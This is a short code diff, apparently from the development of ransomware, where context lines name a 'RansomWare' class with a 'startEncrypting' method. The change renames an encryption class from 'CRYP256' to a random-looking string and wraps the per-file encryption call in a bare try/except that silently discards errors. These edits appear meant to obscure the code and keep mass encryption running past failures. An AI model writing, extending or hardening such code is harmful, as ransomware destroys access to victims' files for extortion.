@@ -137,7 +137,7 @@ def mmeee(data):
 
 
 
-class CRYP256:
+class iurgubnrgr:
     def __init__(self):
         self.key = ""
         self.keys = []
@@ -316,7 +316,10 @@ class RansomWare:
     
     def threading_e(self, full_path):
         self.many += 1
-        CRYP256().args_start(full_path, self.password)
+        try:
+            iurgubnrgr().args_start(full_path, self.password)
+        except:
+            pass
         self.many -= 1
 
     def startEncrypting(self):
